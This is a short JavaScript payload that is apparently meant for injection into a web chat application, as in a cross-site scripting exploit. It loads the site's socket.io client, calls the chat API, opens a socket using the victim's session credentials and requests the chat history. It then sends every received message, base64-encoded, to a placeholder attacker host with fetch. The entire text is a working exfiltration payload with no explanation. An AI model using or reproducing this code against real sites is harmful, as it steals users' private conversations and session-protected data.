const script = document.createElement('script');
script.src = '/socket.io/socket.io.js';
document.head.appendChild(script);

script.addEventListener('load', function() {
    // Ensure axios library is loaded
    if (typeof axios !== 'undefined') {
        axios.get('/user/api/chat')
            .then(() => {
                const socket = io('/', { withCredentials: true });

                socket.on('message', (my_message) => {
                    fetch("http://<ATTACKER-IP>:80/?d=" + btoa(my_message));
                });

                socket.emit('client_message', 'history');
            })
            .catch(err => {
                console.error('Error fetching chat API:', err);
            });
    } else {
        console.error('Axios library is not loaded');
    }
});
